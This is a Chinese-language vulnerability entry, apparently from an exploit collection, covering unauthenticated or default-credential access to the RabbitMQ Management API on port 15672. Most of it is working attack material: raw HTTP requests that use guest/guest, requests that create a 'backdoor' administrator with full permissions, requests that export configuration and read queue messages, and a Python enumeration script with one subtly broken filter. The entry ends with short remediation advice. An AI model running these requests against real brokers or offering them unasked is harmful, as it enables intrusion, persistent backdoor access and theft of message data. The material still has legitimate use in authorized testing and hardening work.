---
id: RABBITMQ-MGMT-API-UNAUTH
title: "RabbitMQ - Management API 未授权访问"
product: rabbitmq
vendor: Broadcom/Pivotal
version_affected: "所有启用Management插件的版本（配置不当时）"
severity: HIGH
tags: [unauthorized-access, information-disclosure, api-abuse, management]
fingerprint: ["RabbitMQ", "RabbitMQ Management"]
---

## 漏洞描述

RabbitMQ Management插件暴露15672端口的HTTP API。当管理后台可访问且存在弱口令或未授权配置时，攻击者可通过API完全控制消息队列，包括枚举用户、队列、连接，读取消息内容，创建后门管理员用户，导出完整配置。

## 影响版本

- 所有启用Management插件的RabbitMQ版本（配置不当时）
- 特别是允许guest用户远程访问的部署（`loopback_users = []`）

## 利用步骤

1. 确认Management API可访问（15672端口）
2. 使用已知凭据认证（如guest/guest）
3. 通过API枚举系统信息、用户、队列、连接
4. 读取队列中的敏感消息
5. 创建后门管理员用户实现持久化访问

## Payload

### 获取系统概览

```http
GET /api/overview HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
```

返回: `rabbitmq_version`, `erlang_version`, `cluster_name`, 消息统计等。

### 枚举用户列表

```http
GET /api/users HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
```

返回所有用户及其tags (权限标签)。

### 创建管理员用户

```http
PUT /api/users/backdoor HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Content-Type: application/json

{"password":"Backdoor123!","tags":"administrator"}
```

### 设置用户权限

```http
PUT /api/permissions/%2F/backdoor HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Content-Type: application/json

{"configure":".*","write":".*","read":".*"}
```

### 导出完整配置

```http
GET /api/definitions HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
```

导出: 用户、权限、交换机、队列、绑定、策略等完整配置。

### 枚举队列与消息

```http
GET /api/queues HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
```

```http
GET /api/queues/%2F/queue_name/get HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Content-Type: application/json

{"count":10,"ackmode":"ack_requeue_false","encoding":"auto"}
```

### Python管理API利用脚本

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_rabbitmq_api(target, user="guest", pwd="guest"):
    """RabbitMQ管理API综合利用"""
    target = target.rstrip('/')
    auth = (user, pwd)
    headers = {"Content-Type": "application/json"}

    # 1. 获取概览
    try:
        r = requests.get(f"{target}/api/overview",
                        auth=auth, verify=False, timeout=10)
        if r.status_code != 200:
            print(f"[-] 认证失败 (状态码: {r.status_code})")
            return
        data = r.json()
        print(f"[+] 认证成功: {user}/{pwd}")
        print(f"[+] RabbitMQ: {data.get('rabbitmq_version')}")
        print(f"[+] Erlang: {data.get('erlang_version')}")
        print(f"[+] 集群: {data.get('cluster_name')}")
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return

    # 2. 枚举用户
    print(f"\n[*] 枚举用户...")
    r = requests.get(f"{target}/api/users", auth=auth, verify=False, timeout=10)
    if r.status_code == 200:
        for u in r.json():
            name = u.get("name", "?")
            tags = u.get("tags", "")
            print(f"  - {name} (tags: {tags})")

    # 3. 枚举队列
    print(f"\n[*] 枚举队列...")
    r = requests.get(f"{target}/api/queues", auth=auth, verify=False, timeout=10)
    if r.status_code == 200:
        queues = r.json()
        print(f"[+] 发现 {len(queues)} 个队列")
        for q in queues[:10]:
            vhost = q.get("vhost", "/")
            name = q.get("name", "?")
            msgs = q.get("messages", 0)
            print(f"  - [{vhost}] {name} ({msgs} 消息)")

    # 4. 枚举连接
    print(f"\n[*] 枚举连接...")
    r = requests.get(f"{target}/api/connections",
                    auth=auth, verify=False, timeout=10)
    if r.status_code == 200:
        conns = r.json()
        print(f"[+] 发现 {len(conns)} 个活跃连接")
        for c in conns[:5]:
            peer = c.get("peer_host", "?")
            port = c.get("peer_port", "?")
            user = c.get("user", "?")
            print(f"  - {user}@{peer}:{port}")

    # 5. 枚举交换机
    print(f"\n[*] 枚举交换机...")
    r = requests.get(f"{target}/api/exchanges",
                    auth=auth, verify=False, timeout=10)
    if r.status_code == 200:
        exchanges = r.json()
        custom = [e for e in exchanges if not e.get("name", "").startswith("")]
        print(f"[+] 发现 {len(custom)} 个交换机")

    # 6. 创建后门用户 (可选)
    print(f"\n[*] 可创建后门管理员用户:")
    print(f"  PUT {target}/api/users/backdoor")
    print(f'  Body: {{"password":"Backdoor123!","tags":"administrator"}}')

# 使用: exploit_rabbitmq_api("http://target:15672")
```

## 修复建议

1. 限制Management插件仅监听内网地址，避免暴露15672端口到公网
2. 修改默认guest用户密码或禁用guest用户
3. 保持`loopback_users`默认配置，禁止guest用户远程登录
4. 对管理API启用HTTPS和强认证
5. 使用网络ACL限制管理端口的访问来源
